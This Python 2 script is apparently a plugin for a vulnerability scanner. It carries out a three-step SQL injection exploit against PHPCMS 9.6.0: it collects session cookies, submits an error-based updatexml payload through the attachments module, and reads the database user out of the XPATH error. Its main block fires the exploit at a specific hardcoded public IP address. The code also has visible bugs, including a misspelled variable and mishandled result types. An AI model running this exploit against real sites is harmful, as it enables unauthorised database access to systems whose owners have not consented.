#!/usr/bin/env python
# encoding: utf-8
from t import T

import requests
import re
import urllib

class P(T):
    def __init__(self):
        T.__init__(self)
        keywords=['phpcms']
    def verify(self,head='',context='',ip='',port='80',productname={},keywords='',hackinfo=''):
        target_url=''
        target_url = 'http://' + ip + ':' + port

        if productname.get('path',''):
            target_url = 'http://'+ip+':'+port+productname.get('path','')
        
        url = target_url.rstrip('/').rstrip('/index.php')
        result = {}
        timeout=3
        result['result']=False
        res=None
        payload = "&id=%*27 and updat*exml(1,con*cat(1,(us*er())),1)%23&modelid=1&catid=1&m=1&f="

        try:
            cookies = {}
            step1 = '{}/index.php?m=wap&a=index&siteid=1'.format(url)
            for c in requests.get(step1, timeout=timeout).cookies:
                if c.name[-7:] == '_siteid':
                    cookie_head = c.name[:6]
                    cookies[cookie_head + '_userid'] = c.value
                    cookies[c.name] = c.value
                    break
                else:
                    return False

            step2 = step2 = "{}/index.php?m=attachment&c=attachments&a=swfupload_json&src={}".format(url, urllib.quote(payload))
            for c in requests.get(step2, cookies=cookies, timeout=timeout).cookies:
                if c.name[-9:] == '_att_json':
                    enc_payload = c.value
                    break
                else:
                    return False

            step3 = "{}/index.php?m=content&c=down&a_k={}".format(url, enc_payload)
            r = requests.get(setp3, cookies=cookies, timeout=timeout)
            result = re.findall('XPATH syntax error: \'(.*?)\'', r.content)
        except Exception,e:
            print e
            return result
        finally:
            if res is not None:
                res.close()
                del res
                
        if result[0]:
      

            info = target_url + "PHPCMS 9.6.0 Sqli Vul"
            result['result']=True
            result['VerifyInfo'] = {}
            result['VerifyInfo']['type']='PHPCMS 9.6.0 Sqli Vul'
            result['VerifyInfo']['URL'] =target_url
            result['VerifyInfo']['payload']=payload
            result['VerifyInfo']['result'] =info
            return result
        return result

if __name__ == '__main__':
    print P().verify(ip='116.213.171.228',port='80')
            
            
            
            